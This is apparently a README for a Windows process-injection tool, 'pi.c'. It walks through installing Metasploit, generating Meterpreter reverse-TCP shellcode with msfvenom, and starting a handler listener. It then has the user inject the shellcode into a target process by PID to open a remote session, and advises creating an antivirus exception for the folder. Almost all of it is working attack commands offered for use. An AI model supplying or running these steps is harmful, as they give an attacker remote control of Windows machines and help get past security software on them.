# process injection

- to run `pi.c`, first create an exception for current folder
- install metasploit on your linux:

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
```

- generate shell code running this command in your linux system:

```bash
msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST={{HOST}} LPORT={{PORT}} EXITFUNC=thread -f c --var-name=moh3aPuke
```

- then configure metasploit:

```txt
msfconsole

msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set lhost {{HOST}}
msf6 exploit(multi/handler) > set lport {{PORT}}
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run -j
```

- build and run the `pi.c` with the process ID as an argument
- on the linux shell, you should see:

```txt
[*] Meterpreter session (int) opened (local address -> remote address) at (timestamp)
```

- start interacting with the session by running:

```txt
msf6 exploit(multi/handler) > sessions -i 1
```
